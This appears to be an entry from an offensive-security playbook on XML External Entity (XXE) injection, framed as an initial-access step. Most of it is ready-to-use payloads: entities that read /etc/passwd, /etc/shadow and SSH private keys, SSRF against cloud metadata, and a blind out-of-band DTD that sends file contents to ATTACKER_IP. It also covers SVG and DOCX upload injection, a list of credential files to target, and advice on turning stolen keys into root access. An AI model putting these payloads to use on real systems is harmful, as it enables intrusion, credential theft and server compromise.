---
id: xxe-injection
title: XXE Injection
stage: initial-access
tags: [web, linux]
summary: Inject a malicious XML entity to read local files or trigger SSRF — any endpoint that parses XML without disabling external entities is vulnerable.
leads_to:
  - rev-shell
  - ssrf
  - linux-cred-hunting
---

## Prerequisites

An endpoint that accepts XML input — SOAP web services, file uploads (DOCX, SVG, XML configs), REST APIs that accept `Content-Type: application/xml`, or JSON endpoints that can be switched to XML. Intercept with Burp to identify XML parsers.

XXE (XML External Entity) exploits the XML parser's ability to load external resources. An injected entity can point to local files (`file:///etc/passwd`) or internal services (`http://169.254.169.254`), reading their content into the response. Blind XXE (no response reflection) uses out-of-band channels — DNS or HTTP to your server.

## Quick Win

> Read `/etc/passwd` — confirms XXE and gives you usernames in one payload.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>
```

## File Read

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/shadow">
]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

```xml
<!-- PHP wrapper for base64-encoded output (avoids XML special char issues) -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>&xxe;</root>
```

## SSRF via XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
```

## Blind XXE (OOB via DTD)

> Host the malicious DTD on your server — parser fetches it and sends file contents back.

```xml
<!-- Payload sent to target -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER_IP/evil.dtd">
  %xxe;
]>
<root>&exfil;</root>
```

```xml
<!-- evil.dtd hosted on attacker -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP/?d=%file;'>">
%wrap;
```

## SVG / DOCX XXE

```xml
<!-- Inject into SVG file upload -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg>&xxe;</svg>
```

```bash
# DOCX: unzip, inject into word/document.xml, rezip
unzip target.docx -d docx_dir
# edit docx_dir/word/document.xml — inject entity
cd docx_dir && zip -r ../evil.docx .
```

## Key Files to Read

```
/etc/passwd
/etc/shadow
/root/.ssh/id_rsa
/home/user/.ssh/id_rsa
/var/www/html/config.php
/var/www/html/.env
/proc/self/environ
```

## Leads To

SSH private key found in `/root/.ssh/id_rsa` → immediate root SSH access. App config files with DB credentials → password-spray or database exploitation. SSRF via XXE → internal service enumeration, cloud metadata. `/etc/shadow` readable → offline hash cracking.
